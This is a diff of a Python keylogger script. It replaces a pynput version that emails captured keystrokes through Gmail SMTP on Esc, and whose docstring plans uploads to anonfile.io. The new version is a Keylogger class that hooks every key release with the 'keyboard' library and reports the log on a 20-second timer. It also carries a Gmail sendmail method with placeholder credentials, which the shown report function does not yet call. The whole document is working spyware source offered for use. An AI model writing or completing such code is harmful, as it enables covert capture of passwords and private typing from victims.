@@ -1,59 +1,64 @@
-"""
-Add masks for special keys
-upload text file to anonfile.io and send the link from there
-
-"""
-
-import pynput
-import smtplib, ssl
-from pynput.keyboard import Key, Listener
-
-receiver_email = "receiver_email@mail.com"
-
-""" Mail to send the keyfile """
-host_mail = "sending_email@gmail.com"
-host_pass = "sending_email_password"
-
-""" Secure Socket Layer (SSL) Opts """
-PORT = 465 # SSL port
-SMTP_SERVER = "smtp.gmail.com" # smtp server address
-# Create a secure SSL context
-CONTEXT = ssl.create_default_context()
+import keyboard
+import smtplib
+from threading import Semaphore, Timer
 
 
-keys = []
-word_count = len(keys)
-
-def key_presses(key):
-    global keys, word_count
-    keys.append(key)
+SEND_REPORT_EVERY = 20
+EMAIL_ADDRESS = "put_real_address_here@gmail.com"
+EMAIL_PASSWORD = "put_real_pw"
 
 
-def send_mail(keys):
-    message = ""
-    for key in keys:
-        _key = str(key).replace("'","")
-        if _key.find("space") > 0:
-            message += "\n"
-        elif _key.find("key") == -1:
-            message += _key
-    try:
-        with smtplib.SMTP_SSL(SMTP_SERVER, PORT, context=CONTEXT) as server:
-            server.login(host_mail, host_pass)
-            server.sendmail(host_mail, receiver_email, message)
-            print("\nEmail successfully sent!")
-    except:
-        print("\nError occurred while trying to send the email.. Please try again.")
+class Keylogger:
+    def __init__(self, interval):
+        self.interval = interval
+        self.log = ""
+        # for blocking after setting the on_release listener
+        self.semaphore = Semaphore(0)
 
+    def callback(self, event):
+        """
+        This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)
+        """
+        name = event.name
+        if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
 
-def release(key):
-    if key == Key.esc:
-        send_mail(keys)
-        return False
+        self.log += name
 
+    def sendmail(self, email, password, message):
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+    def report(self):
+        """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
+        if self.log:
+            print(self.log)
+        self.log = ""
+        Timer(interval=self.interval, function=self.report).start()
+
+    def start(self):
+        keyboard.on_release(callback=self.callback)
+        self.report()
+
+        self.semaphore.acquire()
 
 if __name__ == "__main__":
-    with Listener(on_press=key_presses, on_release=release) as listener:
-        listener.join()
-
-
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    keylogger.start()
